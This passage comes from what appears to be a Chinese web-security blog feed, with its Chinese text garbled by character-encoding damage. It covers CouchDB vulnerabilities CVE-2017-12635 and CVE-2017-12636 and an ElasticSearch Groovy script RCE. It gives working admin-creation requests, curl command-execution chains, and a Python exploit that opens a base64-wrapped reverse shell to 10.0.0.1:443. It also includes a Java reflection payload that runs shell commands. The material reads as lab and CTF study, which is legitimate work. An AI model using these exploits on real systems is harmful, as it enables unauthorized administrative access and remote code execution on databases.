title="CouchDB"></a>CouchDB</h2><p>CouchDBæ˜¯ä¸€ä¸ªå®Œå…¨åŒ…å«webçš„æ•°æ®åº“ã€‚ä½¿ç”¨JSONæ–‡æ¡£å­˜å‚¨æ•°æ®ã€‚é€šè¿‡HTTPä½¿ç”¨webæµè§ˆå™¨è®¿é—®æ‚¨çš„æ–‡æ¡£ã€‚ä½¿ç”¨JavaScriptæŸ¥è¯¢ã€åˆå¹¶å’Œè½¬æ¢æ–‡æ¡£ã€‚CouchDBé€‚ç”¨äºç°ä»£ç½‘ç»œå’Œç§»åŠ¨åº”ç”¨ç¨‹åºã€‚Apache CouchDBæ˜¯ä¸€ä¸ªå¼€æºçš„é¢å‘æ–‡æ¡£çš„NoSQLæ•°æ®åº“ï¼Œç”¨Erlangå®ç°ã€‚CouchDB ä½¿ç”¨å¤šç§æ ¼å¼å’Œåè®®æ¥å­˜å‚¨ã€ä¼ è¾“å’Œå¤„ç†å…¶æ•°æ®ã€‚å®ƒä½¿ç”¨JSONæ¥å­˜å‚¨æ•°æ®ï¼Œä½¿ç”¨MapReduceä½¿ç”¨JavaScriptä½œä¸ºæŸ¥è¯¢è¯­è¨€ï¼Œä½¿ç”¨HTTPä½œä¸ºAPIã€‚</p><h3 id="Couchdb-å‚ç›´æƒé™ç»•è¿‡æ¼æ´ï¼ˆCVE-2017-12635ï¼‰"><a href="#Couchdb-å‚ç›´æƒé™ç»•è¿‡æ¼æ´ï¼ˆCVE-2017-12635ï¼‰" class="headerlink" title="Couchdb å‚ç›´æƒé™ç»•è¿‡æ¼æ´ï¼ˆCVE-2017-12635ï¼‰"></a>Couchdb å‚ç›´æƒé™ç»•è¿‡æ¼æ´ï¼ˆCVE-2017-12635ï¼‰</h3><p><a href="https://blog.csdn.net/qq_45300786/article/details/120287521">https://blog.csdn.net/qq_45300786/article/details/120287521</a><br>ç«¯å£å¯èƒ½æ˜¯5984ï¼Œç›´æ¥è®¿é—®ç«¯å£æ˜¯couchdb,è®¿é—®&#x2F;_utilsç›®å½•ï¼Œç½‘ç«™titleæ˜¯ä¸€ä¸ªçº¢è‰²æ²™å‘ï¼Œtitleåæ˜¯Project Fauxtonè¿˜å¯ä»¥çœ‹åˆ°couchdbå›¾æ ‡<br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-8.png"><br>å½±å“ç‰ˆæœ¬ï¼šå°äº 1.7.0 ä»¥åŠ å°äº 2.1.1ï¼Œå‘é€æ•°æ®åŒ…ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PUT /_users/org.couchdb.user<span class="punctuation">:</span>vulhub HTTP/<span class="number">1.1</span></span><br><span class="line">Host<span class="punctuation">:</span> <span class="number">192.168</span><span class="number">.100</span><span class="number">.34</span><span class="punctuation">:</span><span class="number">5984</span></span><br><span class="line">Accept<span class="punctuation">:</span> *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/json</span></span><br><span class="line"><span class="comment">Content-Length: 94</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  &quot;type&quot;: &quot;user&quot;,</span></span><br><span class="line"><span class="comment">  &quot;name&quot;: &quot;vulhub&quot;,</span></span><br><span class="line"><span class="comment">  &quot;roles&quot;: [&quot;_admin&quot;],</span></span><br><span class="line"><span class="comment">  &quot;password&quot;: &quot;vulhub&quot;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><p>è¿”å›403é”™è¯¯ï¼š{â€œerrorâ€:â€forbiddenâ€,â€reasonâ€:â€Only _admin may set rolesâ€}ï¼Œåªæœ‰ç®¡ç†å‘˜æ‰èƒ½è®¾ç½®Roleè§’è‰²ï¼šå‘é€ä¸€æ¬¡åŒ…å«ä¸¤ä¸ªroleså­—æ®µçš„æ•°æ®åŒ…ï¼Œå³å¯ç»•è¿‡é™åˆ¶ï¼š<br>æ³¨æ„ï¼š1ã€roleså­—æ®µå¿…é¡»ä¸ºç©ºï¼Œ3ã€å·²åˆ›å»ºçš„ç”¨æˆ·ï¼Œä½ æ”¹å¯†ç çš„è¯ï¼Œæ˜¯ä¸è¡Œçš„ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PUT /_users/org.couchdb.user<span class="punctuation">:</span>vulhub HTTP/<span class="number">1.1</span></span><br><span class="line">Host<span class="punctuation">:</span> <span class="number">192.168</span><span class="number">.100</span><span class="number">.34</span><span class="punctuation">:</span><span class="number">5984</span></span><br><span class="line">Accept<span class="punctuation">:</span> *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/json</span></span><br><span class="line"><span class="comment">Content-Length: 94</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  &quot;type&quot;: &quot;user&quot;,</span></span><br><span class="line"><span class="comment">  &quot;name&quot;: &quot;vulhub&quot;,</span></span><br><span class="line"><span class="comment">  &quot;roles&quot;: [&quot;_admin&quot;],</span></span><br><span class="line"><span class="comment">  &quot;roles&quot;: [],</span></span><br><span class="line"><span class="comment">  &quot;password&quot;: &quot;vulhub&quot;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><p>è¾“å…¥æˆ‘ä»¬ä¹‹å‰åˆ›å»ºçš„è´¦å·å¯†ç ï¼švulhub:vulhub <a href="http://xxxx:5984/_utils">http://xxxx:5984/_utils</a> ç™»å½•æˆåŠŸï¼ åŒæ—¶å³å¯çœ‹åˆ°userçš„æ•°é‡å¤šäº†1ä¸ª</p><h3 id="Couchdb-ä»»æ„å‘½ä»¤æ‰§è¡Œ-CVE-2017-12636"><a href="#Couchdb-ä»»æ„å‘½ä»¤æ‰§è¡Œ-CVE-2017-12636" class="headerlink" title="Couchdb ä»»æ„å‘½ä»¤æ‰§è¡Œ CVE-2017-12636"></a>Couchdb ä»»æ„å‘½ä»¤æ‰§è¡Œ CVE-2017-12636</h3><p>å½±å“ç‰ˆæœ¬ï¼šå°äº 1.7.0 ä»¥åŠ å°äº 2.1.1<br>è¯¥æ¼æ´æ˜¯éœ€è¦ç™»å½•ç”¨æˆ·æ–¹å¯è§¦å‘ï¼Œå¦‚æœä¸çŸ¥é“ç›®æ ‡ç®¡ç†å‘˜å¯†ç ï¼Œå¯ä»¥åˆ©ç”¨<a href="https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635">CVE-2017-12635</a>å…ˆå¢åŠ ä¸€ä¸ªç®¡ç†å‘˜ç”¨æˆ·ã€‚<br>å®ƒå…è®¸å·²è®¤è¯çš„ç”¨æˆ·åœ¨ CouchDB æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¿™ä¸ªæ¼æ´ä¸»è¦åˆ©ç”¨äº† CouchDB ä¸­çš„ <code>query_servers</code> é…ç½®é”™è¯¯ï¼Œè¿™æ˜¯ CouchDB ç”¨äºæŒ‡å®šå¦‚ä½•å¤„ç†ä¸åŒç¼–ç¨‹è¯­è¨€æŸ¥è¯¢çš„è®¾ç½®ã€‚</p><p>1.6.0 ä¸‹çš„è¯´æ˜<br>ä¾æ¬¡æ‰§è¡Œå¦‚ä¸‹è¯·æ±‚å³å¯è§¦å‘ä»»æ„å‘½ä»¤æ‰§è¡Œï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT &#x27;http://vulhub:vulhub@your-ip:5984/_config/query_servers/cmd&#x27; -d &#x27;&quot;id &gt;/tmp/success&quot;&#x27;</span><br><span class="line">curl -X PUT &#x27;http://vulhub:vulhub@your-ip:5984/vultest&#x27;</span><br><span class="line">curl -X PUT &#x27;http://vulhub:vulhub@your-ip:5984/vultest/vul&#x27; -d &#x27;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#x27;</span><br><span class="line">curl -X POST &#x27;http://vulhub:vulhub@your-ip:5984/vultest/_temp_view?limit=10&#x27; -d &#x27;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#x27; -H &#x27;Content-Type:application/json&#x27;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­,<code>vulhub:vulhub</code>ä¸ºç®¡ç†å‘˜è´¦å·å¯†ç ã€‚<br>ç¬¬ä¸€ä¸ªè¯·æ±‚æ˜¯æ·»åŠ ä¸€ä¸ªåå­—ä¸º<code>cmd</code>çš„<code>query_servers</code>ï¼Œå…¶å€¼ä¸º<code>&quot;id &gt;/tmp/success&quot;</code>ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬åé¢å¾…æ‰§è¡Œçš„å‘½ä»¤ã€‚<br>ç¬¬äºŒã€ä¸‰ä¸ªè¯·æ±‚æ˜¯æ·»åŠ ä¸€ä¸ªDatabaseå’ŒDocumentï¼Œè¿™é‡Œæ·»åŠ äº†åé¢æ‰èƒ½æŸ¥è¯¢ã€‚<br>ç¬¬å››ä¸ªè¯·æ±‚å°±æ˜¯åœ¨è¿™ä¸ªDatabaseé‡Œè¿›è¡ŒæŸ¥è¯¢ï¼Œå› ä¸ºæˆ‘å°†languageè®¾ç½®ä¸º<code>cmd</code>ï¼Œè¿™é‡Œå°±ä¼šç”¨åˆ°æˆ‘ç¬¬ä¸€æ­¥é‡Œæ·»åŠ çš„åä¸º<code>cmd</code>çš„<code>query_servers</code>ï¼Œæœ€åè§¦å‘å‘½ä»¤æ‰§è¡Œã€‚</p><p>2.1.0 ä¸‹çš„è¯´æ˜ï¼Œ2.1.0ä¸­ä¿®æ”¹äº†ä¸Šé¢ç”¨åˆ°çš„ä¸¤ä¸ªAPIï¼Œè¿™é‡Œéœ€è¦è¯¦ç»†è¯´æ˜ä¸€ä¸‹ã€‚<br>Couchdb 2.x å¼•å…¥äº†é›†ç¾¤ï¼Œæ‰€ä»¥ä¿®æ”¹é…ç½®çš„APIéœ€è¦å¢åŠ node nameã€‚è¿™ä¸ªå…¶å®ä¹Ÿç®€å•ï¼Œæˆ‘ä»¬å¸¦ä¸Šè´¦å·å¯†ç è®¿é—®<code>/_membership</code>å³å¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://vulhub:vulhub@your-ip:5984/_membership</span><br></pre></td></tr></table></figure><p><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-9.png"><br>å¯è§ï¼Œæˆ‘ä»¬è¿™é‡Œåªæœ‰ä¸€ä¸ªnodeï¼Œåå­—æ˜¯<code>nonode@nohost</code>ã€‚<br>ç„¶åï¼Œæˆ‘ä»¬ä¿®æ”¹<code>nonode@nohost</code>çš„é…ç½®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd -d &#x27;&quot;id &gt;/tmp/success&quot;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-10.png"><br>ç„¶åï¼Œä¸1.6.0çš„åˆ©ç”¨æ–¹å¼ç›¸åŒï¼Œæˆ‘ä»¬å…ˆå¢åŠ ä¸€ä¸ªDatabaseå’Œä¸€ä¸ªDocumentï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT &#x27;http://vulhub:vulhub@your-ip:5984/vultest&#x27;</span><br><span class="line">curl -X PUT &#x27;http://vulhub:vulhub@your-ip:5984/vultest/vul&#x27; -d &#x27;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#x27;</span><br></pre></td></tr></table></figure><p>Couchdb 2.xåˆ é™¤äº†<code>_temp_view</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸ºäº†è§¦å‘<code>query_servers</code>ä¸­å®šä¹‰çš„å‘½ä»¤ï¼Œéœ€è¦æ·»åŠ ä¸€ä¸ª<code>_view</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/_design/vul -d &#x27;&#123;&quot;_id&quot;:&quot;_design/test&quot;,&quot;views&quot;:&#123;&quot;wooyun&quot;:&#123;&quot;map&quot;:&quot;&quot;&#125; &#125;,&quot;language&quot;:&quot;cmd&quot;&#125;&#x27; -H &quot;Content-Type: application/json&quot;</span><br></pre></td></tr></table></figure><p>å¢åŠ <code>_view</code>çš„åŒæ—¶å³è§¦å‘äº†<code>query_servers</code>ä¸­çš„å‘½ä»¤ã€‚</p><p>åˆ©ç”¨expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;http://your-ip:5984&#x27;</span></span><br><span class="line">command = <span class="string">rb&quot;&quot;&quot;sh -i &gt;&amp; /dev/tcp/10.0.0.1/443 0&gt;&amp;1&quot;&quot;&quot;</span></span><br><span class="line">version = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">session.headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># session.proxies = &#123;</span></span><br><span class="line"><span class="comment">#     &#x27;http&#x27;: &#x27;http://127.0.0.1:8085&#x27;</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line">session.put(target + <span class="string">&#x27;/_users/org.couchdb.user:wooyun&#x27;</span>, data=<span class="string">&#x27;&#x27;&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;type&quot;: &quot;user&quot;,</span></span><br><span class="line"><span class="string">  &quot;name&quot;: &quot;wooyun&quot;,</span></span><br><span class="line"><span class="string">  &quot;roles&quot;: [&quot;_admin&quot;],</span></span><br><span class="line"><span class="string">  &quot;roles&quot;: [],</span></span><br><span class="line"><span class="string">  &quot;password&quot;: &quot;wooyun&quot;</span></span><br><span class="line"><span class="string">&#125;&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">session.auth = HTTPBasicAuth(<span class="string">&#x27;wooyun&#x27;</span>, <span class="string">&#x27;wooyun&#x27;</span>)</span><br><span class="line"></span><br><span class="line">command = <span class="string">&quot;bash -c &#x27;&#123;echo,%s&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;&quot;</span> % base64.b64encode(command).decode()</span><br><span class="line"><span class="keyword">if</span> version == <span class="number">1</span>:</span><br><span class="line">    session.put(target + (<span class="string">&#x27;/_config/query_servers/cmd&#x27;</span>), data=json.dumps(command))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    host = session.get(target + <span class="string">&#x27;/_membership&#x27;</span>).json()[<span class="string">&#x27;all_nodes&#x27;</span>][<span class="number">0</span>]</span><br><span class="line">    session.put(target + <span class="string">&#x27;/_node/&#123;&#125;/_config/query_servers/cmd&#x27;</span>.<span class="built_in">format</span>(host), data=json.dumps(command))</span><br><span class="line"></span><br><span class="line">session.put(target + <span class="string">&#x27;/wooyun&#x27;</span>)</span><br><span class="line">session.put(target + <span class="string">&#x27;/wooyun/test&#x27;</span>, data=<span class="string">&#x27;&#123;&quot;_id&quot;: &quot;wooyuntest&quot;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> version == <span class="number">1</span>:</span><br><span class="line">    session.post(target + <span class="string">&#x27;/wooyun/_temp_view?limit=10&#x27;</span>, data=<span class="string">&#x27;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    session.put(target + <span class="string">&#x27;/wooyun/_design/test&#x27;</span>, data=<span class="string">&#x27;&#123;&quot;_id&quot;:&quot;_design/test&quot;,&quot;views&quot;:&#123;&quot;wooyun&quot;:&#123;&quot;map&quot;:&quot;&quot;&#125; &#125;,&quot;language&quot;:&quot;cmd&quot;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å…·ä½“æ¥åˆ†æä¸‹ä¸Šé¢çš„æ¼æ´ï¼Œå¯ä»¥æ€»ç»“ä¸ºä»¥ä¸‹æ­¥éª¤ï¼š</p><h4 id="1-ä¿®æ”¹-query-servers-é…ç½®"><a href="#1-ä¿®æ”¹-query-servers-é…ç½®" class="headerlink" title="1. ä¿®æ”¹ query_servers é…ç½®"></a>1. ä¿®æ”¹ <code>query_servers</code> é…ç½®</h4><ul><li>æ”»å‡»è€…é¦–å…ˆå°† <code>query_servers</code> ä¸­ç”¨äºå¤„ç†å‘½ä»¤çš„å¤„ç†å™¨ï¼ˆå¦‚ <code>cmd</code>ï¼‰è®¾ç½®ä¸ºæ‰§è¡Œä»»æ„å‘½ä»¤çš„è„šæœ¬æˆ–å‘½ä»¤ã€‚ä¾‹å¦‚ï¼Œé€šè¿‡ä»¥ä¸‹è¯·æ±‚ï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT &#x27;http://username:password@your-ip:5984/_config/query_servers/cmd&#x27; -d &#x27;&quot;id &gt;/tmp/success&quot;&#x27;</span><br></pre></td></tr></table></figure>è¿™é‡Œï¼Œ<code>username:password</code> æ˜¯å·²çŸ¥çš„ç®¡ç†å‘˜å‡­æ®ï¼Œ<code>your-ip</code> æ˜¯ç›®æ ‡ CouchDB æœåŠ¡å™¨çš„ IP åœ°å€ã€‚</li></ul><h4 id="2-è§¦å‘å‘½ä»¤æ‰§è¡Œ"><a href="#2-è§¦å‘å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="2. è§¦å‘å‘½ä»¤æ‰§è¡Œ"></a>2. è§¦å‘å‘½ä»¤æ‰§è¡Œ</h4><ul><li>ç„¶åï¼Œæ”»å‡»è€…åˆ›å»ºä¸€ä¸ªæ–°çš„æ•°æ®åº“å’Œæ–‡æ¡£ï¼Œä¸ºè§¦å‘å‘½ä»¤æ‰§è¡Œåšå‡†å¤‡ã€‚åˆ›å»ºæ•°æ®åº“å’Œæ–‡æ¡£çš„è¯·æ±‚ä¸åŒ…å«ä»»ä½•æ¶æ„ä»£ç ï¼Œå®ƒä»¬ä»…ä»…æ˜¯ä¸ºäº†åç»­çš„æŸ¥è¯¢æ“ä½œåšå‡†å¤‡ã€‚</li><li>æœ€åï¼Œæ”»å‡»è€…é€šè¿‡åˆ›å»ºä¸€ä¸ªç‰¹æ®Šçš„è§†å›¾ï¼ˆåœ¨ CouchDB 2.x ä¸­æ˜¯ <code>_design</code> æ–‡æ¡£ï¼‰è§¦å‘å‘½ä»¤æ‰§è¡Œã€‚è§†å›¾çš„ <code>language</code> å±æ€§è¢«è®¾ç½®ä¸º <code>cmd</code>ï¼Œè¿™å‘Šè¯‰ CouchDB ä½¿ç”¨ <code>cmd</code> å¤„ç†å™¨æ¥è§£é‡Šå’Œæ‰§è¡Œè§†å›¾çš„ Map å‡½æ•°ï¼Œè€Œ Map å‡½æ•°å®é™…ä¸Šæ˜¯è¢«é…ç½®ä¸ºæ‰§è¡Œä»»æ„å‘½ä»¤çš„è„šæœ¬ã€‚</li></ul><h4 id="CouchDB-1-x-å’Œ-2-x-çš„åŒºåˆ«"><a href="#CouchDB-1-x-å’Œ-2-x-çš„åŒºåˆ«" class="headerlink" title="CouchDB 1.x å’Œ 2.x çš„åŒºåˆ«"></a>CouchDB 1.x å’Œ 2.x çš„åŒºåˆ«</h4><ul><li>åœ¨ CouchDB 2.x ä¸­ï¼Œç”±äºå¼•å…¥äº†é›†ç¾¤æ¨¡å¼ï¼Œä¿®æ”¹é…ç½®çš„ API éœ€è¦åŒ…æ‹¬èŠ‚ç‚¹åç§°ã€‚æ”»å‡»è€…é¦–å…ˆéœ€è¦æŸ¥è¯¢èŠ‚ç‚¹åç§°ï¼Œç„¶åé’ˆå¯¹ç‰¹å®šèŠ‚ç‚¹ä¿®æ”¹ <code>query_servers</code> é…ç½®ã€‚</li><li>CouchDB 2.x ä¸­åˆ é™¤äº† <code>_temp_view</code>ï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡åˆ›å»ºæ°¸ä¹…è§†å›¾æ¥è§¦å‘å‘½ä»¤æ‰§è¡Œã€‚</li></ul><h2 id="ElasticSearch-æ–‡ä»¶å†™å…¥-RCE-æ¼æ´"><a href="#ElasticSearch-æ–‡ä»¶å†™å…¥-RCE-æ¼æ´" class="headerlink" title="ElasticSearch-æ–‡ä»¶å†™å…¥&amp;RCE-æ¼æ´"></a>ElasticSearch-æ–‡ä»¶å†™å…¥&amp;RCE-æ¼æ´</h2><p><a href="https://www.cnblogs.com/cute-puli/p/15359890.html">https://www.cnblogs.com/cute-puli/p/15359890.html</a></p><p>1.5.xä»¥å‰ï¼ˆå…¶å®è·ŸCVE-2015-5531-ElasticSearch ç›®å½•ç©¿è¶Šæ˜¯å·®ä¸å¤šç±»å‹çš„æ¼æ´ï¼Œç›¸å½“äºæ˜¯åˆ©ç”¨è¯¥æ¼æ´æ¥getshellå§ï¼‰<br>è®¿é—®å­˜åœ¨çš„æ¼æ´é¡µé¢ï¼šï¼ˆ9200ä¸€èˆ¬ä¸ºElasticSearchçš„å¸¸ç”¨ç«¯å£ï¼‰ï¼Œæ­¤æ¼æ´ç¯å¢ƒéœ€è¦ä¸tomcatç»“åˆä½¿ç”¨ï¼Œå‘ç°8080ç«¯å£å­˜åœ¨tomcaté»˜è®¤é…ç½®é¡µé¢ã€‚å‘ç°9200ç«¯å£å­˜åœ¨elasticsearché¡µé¢ï¼š<br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-11.png"><br>çœ‹åˆ°elasticSearchçš„ç‰ˆæœ¬ä¸º1.4.1çŒœæµ‹å¯èƒ½å­˜åœ¨rceæ¼æ´ï¼Œæ‰“å¼€burpsuite ï¼Œå¼€å¯ä»£ç†æŠ“å–æ•°æ®åŒ…å¹¶æŠŠæ•°æ®åŒ…å¹¶æŠŠæ•°æ®åŒ…æ”¾åˆ°é‡æ”¾å™¨ä¸­ã€‚<br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-12.png"><br>ç”±äºæŸ¥è¯¢æ—¶è‡³å°‘è¦æ±‚ElasticSearchä¸­æœ‰ä¸€æ¡æ•°æ®ï¼Œæ‰€ä»¥æ›¿æ¢å¦‚ä¸‹æ•°æ®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /website/blog/ HTTP/1.1</span><br><span class="line">Host: eci-2ze6p6jlhlj2syghya9p.cloudeci1.ichunqiu.com:9200</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.43</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 26</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;name&quot;: &quot;test&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-13.png"><br>åˆ©ç”¨åå°„æœºåˆ¶æ‰§è¡ŒJAVAä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /_search?pretty HTTP/1.1</span><br><span class="line">Host: eci-2ze6p6jlhlj2syghya9p.cloudeci1.ichunqiu.com:9200</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.43</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/text</span><br><span class="line">Content-Length: 500</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;size&quot;:1,</span><br><span class="line">&quot;script_fields&quot;: &#123;</span><br><span class="line">&quot;test#&quot;: &#123;</span><br><span class="line">&quot;script&quot;:&quot;java.lang.Math.class.forName(\&quot;java.io.BufferedReader\&quot;).getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\&quot;java.io.InputStreamReader\&quot;).getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\&quot;java.lang.Runtime\&quot;).getRuntime().exec(\&quot;cat /flag\&quot;).getInputStream())).readLines()&quot;,</span><br><span class="line">&quot;lang&quot;: &quot;groovy&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-14.png"><br>çœ‹åˆ°æœ‰åŠ å¯†è¿‡çš„æ–‡ä»¶çŒœæµ‹å¯èƒ½æ˜¯base64ç¼–ç ï¼Œç”¨burpsuiteè‡ªå¸¦çš„è§£ç å·¥å…·å°è¯•<br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-15.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ•°æ®åº“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€webå®‰å…¨ã€‘APIå®‰å…¨çŸ¥è¯†æ•´ç†</title>
      <link href="/2024/09/27/WebSecurity/owasptop/apisecurity/"/>
      <url>/2024/09/27/WebSecurity/owasptop/apisecurity/</url>
      
